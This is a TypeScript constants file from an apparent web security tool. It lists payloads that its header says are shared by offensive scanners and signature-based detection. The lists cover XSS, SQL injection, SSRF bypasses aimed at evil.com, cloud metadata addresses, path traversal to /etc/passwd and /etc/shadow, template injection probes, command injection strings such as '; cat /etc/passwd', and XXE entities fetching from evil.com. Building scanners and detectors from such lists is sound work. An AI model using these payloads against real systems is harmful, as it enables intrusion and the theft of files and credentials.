/**
 * T3MP3ST BLU3H4T — Payload Constants (extracted from Arsenal)
 *
 * Shared payload databases used by both offensive tools (Arsenal) and
 * defensive detection (SignatureMatcher). Single source of truth.
 */

// =============================================================================
// XSS PAYLOADS
// =============================================================================

export const XSS_PAYLOADS = [
  { payload: '<script>alert(1)</script>', name: 'Basic script tag' },
  { payload: '<img src=x onerror=alert(1)>', name: 'IMG onerror' },
  { payload: '"><svg onload=alert(1)>', name: 'SVG onload breakout' },
  { payload: "'-alert(1)-'", name: 'JS string breakout' },
  { payload: '<body onload=alert(1)>', name: 'Body onload' },
  { payload: '{{constructor.constructor("alert(1)")()}}', name: 'Template injection' },
] as const;

// =============================================================================
// SQL INJECTION PAYLOADS
// =============================================================================

export const SQLI_PAYLOADS = [
  { payload: "'", name: 'Single quote', type: 'error' },
  { payload: "''", name: 'Double single quote', type: 'error' },
  { payload: "' OR '1'='1", name: 'Boolean OR true', type: 'boolean' },
  { payload: "' AND '1'='2", name: 'Boolean AND false', type: 'boolean' },
  { payload: '1 UNION SELECT NULL--', name: 'UNION attempt', type: 'union' },
  { payload: "'; WAITFOR DELAY '0:0:0'--", name: 'MSSQL time delay', type: 'time' },
  { payload: "' AND SLEEP(0)--", name: 'MySQL time delay', type: 'time' },
] as const;

export const SQLI_ERROR_PATTERNS = [
  /sql syntax/i, /mysql/i, /mariadb/i, /postgresql/i, /sqlite/i,
  /ora-\d{5}/i, /microsoft sql/i, /odbc/i, /jdbc/i,
  /syntax error/i, /unclosed quotation/i, /unterminated string/i,
  /quoted string not properly terminated/i, /sql command not properly ended/i,
  /invalid query/i, /database error/i, /db error/i,
  /you have an error in your sql/i, /supplied argument is not a valid/i,
];

// =============================================================================
// SSRF PAYLOADS
// =============================================================================

export const SSRF_PAYLOADS = [
  { payload: 'https://evil.com', name: 'Direct external URL' },
  { payload: '//evil.com', name: 'Protocol-relative URL' },
  { payload: '/\\evil.com', name: 'Backslash bypass' },
  { payload: 'https://evil.com%00.legitimate.com', name: 'Null byte injection' },
  { payload: 'https://evil.com?.legitimate.com', name: 'Question mark bypass' },
  { payload: 'https://evil.com#.legitimate.com', name: 'Fragment bypass' },
  { payload: 'https://evil.com@legitimate.com', name: 'At-sign bypass' },
  { payload: '/%2f/evil.com', name: 'URL-encoded slash bypass' },
  { payload: 'javascript:alert(1)', name: 'JavaScript URI' },
  { payload: 'data:text/html,<script>alert(1)</script>', name: 'Data URI' },
] as const;

export const SSRF_CLOUD_METADATA = [
  '169.254.169.254',
  '100.100.100.200',
  'metadata.google.internal',
  '169.254.170.2',
];

// =============================================================================
// LFI PAYLOADS
// =============================================================================

export const LFI_PAYLOADS = [
  { payload: '../../../../etc/passwd', name: 'Basic traversal (etc/passwd)' },
  { payload: '....//....//....//....//etc/passwd', name: 'Double dot filter bypass' },
  { payload: '..%2f..%2f..%2f..%2fetc%2fpasswd', name: 'URL-encoded traversal' },
  { payload: '..%252f..%252f..%252f..%252fetc%252fpasswd', name: 'Double-encoded traversal' },
  { payload: '/etc/passwd', name: 'Absolute path (etc/passwd)' },
  { payload: '../../../../etc/shadow', name: 'Shadow file attempt' },
  { payload: '../../../../windows/system32/drivers/etc/hosts', name: 'Windows hosts file' },
  { payload: '../../../../windows/win.ini', name: 'Windows win.ini' },
  { payload: 'php://filter/convert.base64-encode/resource=/etc/passwd', name: 'PHP filter wrapper' },
  { payload: '/proc/self/environ', name: 'Proc environ' },
] as const;

export const LFI_LINUX_SIGNATURES = ['root:', 'bin:', 'daemon:', 'nobody:', '/bin/bash', '/bin/sh', 'nologin'];
export const LFI_WINDOWS_SIGNATURES = ['[boot loader]', '[fonts]', '[extensions]', '[mci extensions]', 'for 16-bit app support'];

// =============================================================================
// SSTI PAYLOADS
// =============================================================================

export const SSTI_PAYLOADS = [
  { payload: '{{7*7}}', expected: '49', name: 'Jinja2/Twig double-brace' },
  { payload: '${7*7}', expected: '49', name: 'FreeMarker/Spring EL dollar-brace' },
  { payload: '#{7*7}', expected: '49', name: 'Thymeleaf hash-brace' },
  { payload: '<%= 7*7 %>', expected: '49', name: 'ERB/JSP expression tag' },
  { payload: "{{7*'7'}}", expected: '7777777', name: 'Jinja2 string multiplication' },
  { payload: '{{config}}', expected: '', name: 'Jinja2 config access probe' },
  { payload: '{{self.__class__}}', expected: '', name: 'Jinja2 class introspection' },
  { payload: '${T(java.lang.Runtime)}', expected: '', name: 'Spring RCE probe' },
  { payload: '{php}echo 7*7;{/php}', expected: '49', name: 'Smarty PHP tag' },
] as const;

// =============================================================================
// COMMAND INJECTION PAYLOADS
// =============================================================================

export const CMDI_PAYLOADS = [
  { payload: '; id', name: 'Semicolon injection (id)' },
  { payload: '| id', name: 'Pipe injection (id)' },
  { payload: '`id`', name: 'Backtick injection (id)' },
  { payload: '$(id)', name: 'Dollar paren injection (id)' },
  { payload: '|| id', name: 'OR injection (id)' },
  { payload: '&& id', name: 'AND injection (id)' },
  { payload: '; cat /etc/passwd', name: 'Semicolon /etc/passwd read' },
  { payload: '| whoami', name: 'Pipe whoami' },
] as const;

// =============================================================================
// XXE PAYLOADS
// =============================================================================

export const XXE_PAYLOADS = [
  { payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', name: 'Classic XXE' },
  { payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>', name: 'OOB XXE' },
  { payload: '<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>', name: 'External DTD' },
] as const;

// =============================================================================
// SENSITIVE PATHS (for access pattern anomaly)
// =============================================================================

export const SENSITIVE_PATHS = [
  '/admin', '/.git', '/.git/config', '/.env', '/wp-config.php',
  '/backup', '/config', '/database', '/dump', '/export',
  '/phpmyadmin', '/adminer', '/.htpasswd', '/.htaccess',
  '/server-status', '/server-info', '/elmah.axd',
  '/web.config', '/crossdomain.xml', '/clientaccesspolicy.xml',
  '/debug', '/trace', '/console', '/actuator', '/metrics',
  '/health', '/info', '/beans', '/env', '/heapdump', '/threaddump',
];
